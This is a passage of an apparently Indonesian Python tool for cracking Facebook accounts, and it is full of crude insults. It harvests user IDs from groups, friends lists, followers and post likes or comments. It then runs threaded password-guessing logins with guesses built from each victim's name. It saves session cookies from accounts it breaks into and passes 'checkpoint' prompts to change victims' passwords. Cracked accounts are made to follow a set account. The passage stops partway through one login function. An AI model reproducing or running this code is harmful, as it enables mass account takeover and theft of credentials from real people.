                        prints(Panel(f"[bold white][[bold red]![bold white]] group dengan id {kontol} tidak ditemukan"));time.sleep(2);menu()
                    else:
                        prints(Panel("[bold white][[bold cyan]*[bold white]] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:]))
                    prints(Panel("[bold white][[bold yellow]![bold white]] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."))
                    crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    connect_error()
                except (KeyError, IOError):
                    cokieinvalid()
        print()
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] total id terkumpul : [bold red]{len(id)}"""))
        settingcrack()
        methode()
        settingspassword()
        threadpool()
    elif pilih in ['2', '02']:
        if "Trial" in _status_:
            prints(Panel(f"[bold white][[bold red]![bold white]] user trial cuma bisa mengambil [bold red]1000[bold white] id..."))
            dump_teman("1000")
        else:
            dump_teman("5000")
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] total id : [bold red]{len(id)}"""))
        settingcrack()
        methode()
        settingspassword()
        threadpool()
    elif pilih in ['3', '03']:
        if "Trial" in _status_:
            prints(Panel("""[bold white][[bold red]×[bold white]] anda adalah user trial cuma bisa menggunakan menu nomor [bold cyan]02[bold white]. upgrade ke premium untuk menikmati semua fitur..."""))
            time.sleep(3)
            menu()
        else:
            dump_folowers()
            prints(Panel(f"""[bold white][[bold cyan]*[bold white]] total id : [bold red]{len(id)}"""))
            settingcrack()
            methode()
            settingspassword()
            threadpool()
    elif pilih in ['4', '04']:
        if "Trial" in _status_:
            prints(Panel("""[bold white][[bold red]×[bold white]] anda adalah user trial cuma bisa menggunakan menu nomor [bold cyan]02[bold white]. upgrade ke premium untuk menikmati semua fitur..."""))
            time.sleep(3)
            menu()
        else:
            try:
                open('.cokie.txt', 'r').read()
            except (KeyError, IOError):
                needcookies()
            kontol = input(f"  {P}[{O}?{P}] masukan id postingan : ")
            if kontol in[""," "]:
                prints(Panel('[bold white][[bold red]![bold white]] jangan kosong kentod!'));time.sleep(2);menu()
            try:
                prints(Panel("[bold white][[bold yellow]![bold white]] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."))
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
            except KeyError:
                prints(Panel(f"[bold white][[bold red]![bold white]] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod"));time.sleep(2);menu()
            print()
            prints(Panel(f"""[bold white][[bold cyan]*[bold white]] total id terkumpul : [bold red]{len(id)}"""))
            settingcrack()
            methode()
            settingspassword()
            threadpool()
    elif pilih in ['6', '06']:
        if "Trial" in _status_:
            prints(Panel("""[bold white][[bold red]×[bold white]] anda adalah user trial cuma bisa menggunakan menu nomor [bold cyan]02[bold white]. upgrade ke premium untuk menikmati semua fitur..."""))
            time.sleep(3)
            menu()
        else:
            try:
                open('.cokie.txt', 'r').read()
            except (KeyError, IOError):
                needcookies()
            kontol = input(f"  {P}[{O}?{P}] masukan id postingan : ")
            if kontol in[""," "]:
                prints(Panel('[bold white][[bold red]![bold white]] jangan kosong kentod!'));time.sleep(2);menu()
            try:
                prints(Panel("[bold white][[bold yellow]![bold white]] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."))
                ngomen_post(f"https://mbasic.facebook.com/{kontol}")
            except KeyError:
                prints(Panel(f"[bold white][[bold red]![bold white]] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod"));time.sleep(2);menu()
            print()
            prints(Panel(f"""[bold white][[bold cyan]*[bold white]] total id terkumpul : [bold red]{len(id)}"""))
            settingcrack()
            methode()
            settingspassword()
            threadpool()
    elif pilih in ['8', '08']:
        os.remove(urlkey())
        exit()
    elif pilih in ['9', '09']:
        if "Trial" in _status_:
            prints(Panel("""[bold white][[bold red]×[bold white]] anda adalah user trial cuma bisa menggunakan menu nomor [bold cyan]02[bold white]. upgrade ke premium untuk menikmati semua fitur..."""))
            time.sleep(3)
            menu()
        else:
            cekFiles()
    elif pilih in ['0', '00']:
        hapus()
        login()
    else:
        menu()


# ------- CHEKER AKUN CHECKPOINT ------- #
def cekFiles():
    dirs = os.listdir("results")
    prints(Panel(Texts("""[ hasil crack yang tersimpan di file anda ]""", justify="center")))
    for file in dirs:
        print(f"""  {P}[{O}+{P}] {file}""")
    prints(Panel(f"""[bold white][[bold red]![bold white]] sebelum memasukan file,hidupkan mode pesawat 3 detik."""));time.sleep(3)
    files = input("  %s[%s?%s] masukan nama file : %s"%(P,O,P,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        prints(Panel("""[bold white][[bold red]![bold white]] file tidak ada"""));time.sleep(2);menu()
    ww=input(f"  {P}[{O}?{P}] ubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] contoh password : [bold green]Fahmidev[bold white]"""))
        pwBar=input(f"  {P}[{O}+{P}] masukan password baru : ")
        if len(pwBar) <= 5:
             prints(Panel('[bold white][[bold red]![bold white]] kata sandi minimal 6 karakter'))
        else:
            pwBaru.append(pwBar)
    prints(Panel(f"""[bold white][[bold cyan]*[bold white]] Total [bold yellow]{str(len(buka_baju))} Akun"""))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "").replace(" [√] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [×] ", "").replace(" [√] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    prints(Panel('[bold white][ [bold cyan]Proses Pengecekan Selesai [bold white]]'))
    input('  [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");menu()


# ------- CHEKPOINT DETEDTOR ------- #
def log_hasil(user, pasw):
    aman,cp,salah = [],[],[]
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36"
    })
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(P,M,P)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {P}[{M}×{P}] akun sesi new")
        else:
            coki = convert_cookie(session.cookies.get_dict())
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r  🎉{H} hore akunya tidak checkpoint{P}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengecek aplikasi...{P}");time.sleep(0.03)
            cek_apk(coki)
            botfollow(coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  🎉{H} hore akunya tap yes{P}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{P}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "Fahmidev"
                    print(f"\r  🎉{H} hore akunya tap yes{P}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{P}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,P))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(P,O,P,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[1;97m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")


# ------- UBAH PW ------- #
def ubah_pw(session, response, link2, user, mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = convert_cookie(session.cookies.get_dict())
        print(f"\r {P}[{H}✓{P}] berhasil mengubah password menjadi:\n {P}[{H}✓{P}]{H} {user}|{''.join(mmk)}|{coki}{P}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(coki)
        botfollow(coki)


# ------- CEK APLIKASI YANG TERKAIT ------- #
def cek_apk(cookie):
    try:
        r = requests.Session()
        r.get('https://mbasic.facebook.com/home.php', cookies={"cookie": cookie})
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            print("\r   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            print("\r   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
    except:
        prints(Panel("""[bold white][[bold red]![bold white]] cookies invalid"""))


# ------- CRACK DARI GRUP ------- #
def crack_grup(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+" • "+softek[1])
            else:
                id.append(softek[0]+" • "+softek[1])
            sys.stdout.write('\r  %s[%s*%s] sedang mengumpulkan %s id... '%(P,O,P,len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup("https://mbasic.facebook.com"+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+" • "+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+" • "+c[1])
                        sys.stdout.write('\r  %s[%s*%s] sedang mengumpulkan %s id... '%(P,O,P,len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh("https://mbasic.facebook.com"+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"https://mbasic.facebook.com/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass


# ------- CRACK LIKE POSTINGAN ------- #
def like_post(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol=requests.get(hencet,cookies=kueh).text
        if "Semua 0" in kontol:
            prints(Panel("[bold white][[bold red]![bold white]] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v"));time.sleep(2);menu()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+" • "+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+" • "+softek[1])
                sys.stdout.write(f'\r  {P}[{O}*{P}] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post("https://mbasic.facebook.com"+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass


# ------- CRACK KOMENTAR POSTINGAN ------- #
def ngomen_post(hencet):
    try:
        cookiz = open('.cokie.txt').read()
        kueh  = {"cookie":cookiz}
        kontol= requests.get(hencet,cookies=kueh).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+' • '+xd)
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+' • '+xd)
                sys.stdout.write(f'\r  {P}[{O}*{P}] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
    except:pass


# ------- DUMP TEMAN TOKEN ------- #
def dump_teman(limit):
    idz = []
    try:
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] Ketik 'me' jika ingin crack dari daftar teman anda."""))
        idtarget = input(f'  {P}[{O}*{P}] masukan id atau username : ')
        _users_ = __convert__(idtarget)
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(_users_['value'],limit,open('.token.txt', 'r').read()))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            try:
                idz.append(a['id'] + ' • ' + a['name'])
            except (KeyError, IOError):
                menu()
            time.sleep(0.001)
        dmid()
        pilih = input(f"  {P}[{O}?{P}] pilih : ")
        while pilih == '':
            pilih = input(f"  {P}[{O}?{P}] pilih : ")
        if pilih in ["01", "1"]:
            for i in idz:
                if i[:5] in ['10007', '10008', '10006', '10005']:
                    continue
                else:
                    id.append(i)
        elif pilih in ["02", "2"]:
            for i in idz:
                if i[:5] in ['10007', '10008', '10006', '10005']:
                    id.append(i)
                else:
                    continue
        else:
            for i in idz:
                id.append(i)

    except (KeyError, IOError):
        menu()


# ------- DUMP FOLLOWERS TOKEN ------- #
def dump_folowers():
    idz = []
    try:
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] Ketik 'me' jika ingin crack dari total folowers anda."""))
        idtarget = input(f'  {P}[{O}*{P}] masukan id atau username : ')
        _users_ = __convert__(idtarget)
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=500000&access_token=%s'%(_users_['value'],open('.token.txt', 'r').read()))
        z = json.loads(r.text)
        for a in z['data']:
            try:
                idz.append(a['id'] + ' • ' + a['name'])
            except (KeyError, IOError):
                menu()
            time.sleep(0.001)
        dmid()
        pilih = input(f"  {P}[{O}?{P}] pilih : ")
        while pilih == '':
            pilih = input(f"  {P}[{O}?{P}] pilih : ")
        if pilih in ["01", "1"]:
            for i in idz:
                if i[:5] in ['10007', '10008', '10006', '10005']:
                    continue
                else:
                    id.append(i)
        elif pilih in ["02", "2"]:
            for i in idz:
                if i[:5] in ['10007', '10008', '10006', '10005']:
                    id.append(i)
                else:
                    continue
        else:
            for i in idz:
                id.append(i)

    except (KeyError, IOError):
        menu()


# ------- SETTINGS PASSWORD MANUAL & TAMPIL APK ------- #
def settingcrack():
    global tampilapk, manualpas
    isi = input('  %s[%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(P,O,P))
    if isi in ['y', 'Y']:
        manualpas.append("Fahmidev")
        passwordmanual()
    else:
        manualpas.append("")
    setapk()
    isii = input('  %s[%s?%s] ingin menampilkan aplikasi yang terkait [Y/t]: '%(P,M,P))
    if isii in ['y', 'Y']:
        tampilapk.append("Fahmidev")
    else:
        tampilapk.append("")


# ------- PASSWORD MANUAL ------- #
def passwordmanual():
    setpaswm()
    kata = input(f'  {P}[{O}?{P}] masukan kata sandi : ')
    prints(Panel(f'[bold white][[bold cyan]*[bold white]] crack dengan sandi -> [ {kata} ]'))
    if kata == '':
        for pws in ["sayang", "kontol", "anjing"]:
            passwordtambahan.append(pws)
    else:
        for pws in kata.split(","):
            passwordtambahan.append(pws)


# ------- METHODE LOGIN ------- #
def methode():
    try:
        metode()
        pilih = input(f'  {P}[{O}*{P}] method : ')
        while pilih == '':
            pilih = input(f'  {P}[{O}*{P}] method : ')
        if pilih in ['1', '01']:
            methode()
        elif pilih in ['2', '02']:
            Methode.append('log_free')
        elif pilih in ['3', '03']:
            Methode.append('log_mbasic')
        elif pilih in ['4', '04']:
            Methode.append('log_mobilev1')
        else:
            Methode.append('log_mbasic')

    except:
        methode()


# ------- SETTINGS PASSWORD 1, 2, 3, 4, 5 ------- #
def settingspassword():
    global setpas, manualpas
    try:
        setpasw()
        pilih = input(f'  {P}[{O}?{P}] pilih : ')
        if "Fahmidev" in manualpas:
            while pilih == '':
                pilih = input(f'  {P}[{O}?{P}] pilih : ')
            if pilih in ['1', '01']:
                setpas.append('password 1')
            elif pilih in ['2', '02']:
                setpas.append('password 2')
            elif pilih in ['3', '03']:
                setpas.append('password 3')
            elif pilih in ['4', '04']:
                setpas.append('password 4')
            else:
                setpas.append('password 2')
        else:
            while pilih == '':
                pilih = input(f'  {P}[{O}?{P}] pilih : ')
            if pilih in ['1', '01']:
                setpas.append('password 1')
            elif pilih in ['2', '02']:
                setpas.append('password 2')
            else:
                setpas.append('password 2')

    except:
        settingspassword()


# ------- SSETTINGS USER AGENT ------- #
def settingsUserAgent():
    global setusragent
    try:
        setugent()
        pilih = input(f'  {P}[{O}?{P}] pilih : ')
        while pilih == '':
            pilih = input(f'  {P}[{O}?{P}] pilih : ')
        if pilih in ['1', '01']:
            setusragent.append('useragent 1')
        elif pilih in ['2', '02']:
            setusragent.append('useragent 2')
        elif pilih in ['3', '03']:
            setusragent.append('useragent 3')
        else:
            setusragent.append('useragent 3')

    except:
        settingsUserAgent()


# ------- PASSWORD KE 1 ------- #
def passwordv1(nama):
    try:
        password = []
        i = nama.split(" ")[0]
        i = i.lower()
        password.append(i + '123')
        password.append(i + '12345')
        password.append(nama.lower())
        password.append('bangsat')
        return password

    except:
        passwordv1(nama)


# ------- PASSWORD KE 2 ------- #
def passwordv2(nama):
    try:
        password = []
        i = nama.split(" ")[0]
        i = i.lower()
        password.append(i + '123')
        password.append(i + '12345')
        if len(nama.split(" ")) == 3:
            password.append(nama.split(" ")[0].lower() + nama.split(" ")[1].lower())
        password.append(nama.lower())
        password.append('sayang')
        password.append('anjing')
        return password

    except:
        passwordv2(nama)


# ------- PASSWORD KE 3 ------- #
def passwordv3(nama):
    try:
        password = []
        i = nama.split(" ")[0]
        i = i.lower()
        password.append(i + '123')
        password.append(i + '12345')
        password.append(nama.lower())
        return password

    except:
        passwordv3(nama)


# ------- PASSWORD KE 4 ------- #
def passwordv4():
    try:
        password = []
        return password

    except:
        passwordv4()


# ------- TAHUN PEMBUATAN AKUN ------- #
def tahun(fx):
    if re.findall('[a-zA-Z]', str(fx)): tahunz = '';return tahunz
    elif len(fx) == 15:
        if fx[:10] in ('1000000000'):  tahunz = ' 2009';return tahunz
        elif fx[:9] in ('100000000'): tahunz = ' 2009';return tahunz
        elif fx[:8] in ('10000000'):  tahunz = ' 2009';return tahunz
        elif fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):  tahunz = ' 2009';return tahunz
        elif fx[:7] in ('1000006', '1000007', '1000008', '1000009'):  tahunz = ' 2010';return tahunz
        elif fx[:6] in ('100001'):  tahunz = ' 2010/2011';return tahunz
        elif fx[:6] in ('100002', '100003'):  tahunz = ' 2011/2012';return tahunz
        elif fx[:6] in ('100004'):  tahunz = ' 2012/2013';return tahunz
        elif fx[:6] in ('100005', '100006'):  tahunz = ' 2013/2014';return tahunz
        elif fx[:6] in ('100007', '100008'):  tahunz = ' 2014/2015';return tahunz
        elif fx[:6] in ('100009'):  tahunz = ' 2015';return tahunz
        elif fx[:5] in ('10001'): tahunz = ' 2015/2016';return tahunz
        elif fx[:5] in ('10002'): tahunz = ' 2016/2017';return tahunz
        elif fx[:5] in ('10003'): tahunz = ' 2018/2019';return tahunz
        elif fx[:5] in ('10004'): tahunz = ' 2019/2020';return tahunz
        elif fx[:5] in ('10005'): tahunz = ' 2020';return tahunz
        elif fx[:5] in ('10006', '10007', '10008'): tahunz = ' 2021';return tahunz
        else: tahunz = '';return tahunz
    elif len(fx) in (9, 10):  tahunz = ' 2008/2009';return tahunz
    elif len(fx) == 8:  tahunz = ' 2007/2008';return tahunz
    elif len(fx) == 7:  tahunz = ' 2006/2007';return tahunz
    elif len(fx) == 6:  tahunz = ' 2005/2006';return tahunz
    else: tahunz = '';return tahunz


# ------- THREADPOOLEXECUTOR MAIN ------- #
def threadpool():
    global OK, CP, setpas, passwordtambahan, Methode
    info()
    if "log_free" in Methode:
        setlogin = log_free
    elif "log_mbasic" in Methode:
        setlogin = log_mbasic
    elif "log_mobilev1" in Methode:
        setlogin = log_mobilev1
    try: 
        with ThreadPoolExecutor(max_workers=30) as (_fahmidev_):
            for dev in id:
                if "password 1" in setpas:
                    settingpass = passwordv1(dev.split(' • ')[1])
                elif "password 2" in setpas:
                    settingpass = passwordv2(dev.split(' • ')[1])
                elif "password 3" in setpas:
                    settingpass = passwordv3(dev.split(' • ')[1]) + passwordtambahan
                elif "password 4" in setpas:
                    settingpass = passwordv4() + passwordtambahan
                _fahmidev_.submit(setlogin, dev.split(' • ')[0], settingpass)
        
        hasil(OK,CP)
    except Exception as e:
        print(e)


# ------- LOGIN FREE ------- #
def log_free(email, password):
    global OK, CP, loop, tampilapk
    try:
        for pw in password:
            session = requests.Session()
            session.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = session.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":email,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'c_user' in session.cookies.get_dict():
                OK.append(' [✓] %s|%s|%s' % (email,pw,convert_cookie(session.cookies.get_dict())))
                complete = tahun(email)
                h_ok = '\r%s  * --> %s|%s%s%s|%s%s'%(RGB,email, pw, complete, RGB, convert_cookie(session.cookies.get_dict()), RGB)
                if 'Fahmidev' in tampilapk: infoakun3(email, convert_cookie(session.cookies.get_dict()), h_ok)
                else: print(end="\r");prints(Panel(h_ok, title="[bold green]OK"))
                open("results/OK-"+tanggal+".txt", 'a+').write(' [√] %s|%s%s\n' % (email, pw, complete))
                botfollow(convert_cookie(session.cookies.get_dict()))
                break
            elif 'checkpoint' in session.cookies.get_dict():
                CP.append(' [×] %s|%s' % (email,pw))
                try:  ke = requests.get('https://graph.facebook.com/' + email + '?fields=name,id,birthday&access_token=' + open('.token.txt', 'r').read());tt = json.loads(ke.text);ttl = tt['birthday'];(m, d, y) = ttl.split('/');m = bulan_ttl[m];ttll = '|%s %s %s' % (d, m, y);complete = ttll + tahun(email)
                except (KeyError, IOError): ttll = '';complete = tahun(email) + '      '
                h_cp = '\r%s  * --> %s|%s%s%s'%(RYB,email, pw, complete, RPB)
                print(end="\r")
                prints(Panel(h_cp, title="[bold yellow]CP"))
                open("results/CP-"+tanggal+".txt", 'a+').write(' [×] %s|%s%s\n' % (email, pw, complete))
                break
            else:
                continue

        loop += 1
        print('\r  %s[%s*%s] cracking %s/%s -> OK-:%s - CP-:%s'%(P,O,P,loop,len(id),len(OK),len(CP)), end="")

    except requests.exceptions.ConnectionError:
        print('\r  %s[%s!%s] %sKoneksi Error                         '%(P,M,P,P), end="")
        log_free(email, password)


# ------- LOGIN MBASIC ------- #
def log_mbasic(email, password):
    global OK, CP, loop, tampilapk
    try:
        for pw in password:
            session = requests.Session()
            session.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = session.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":email,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
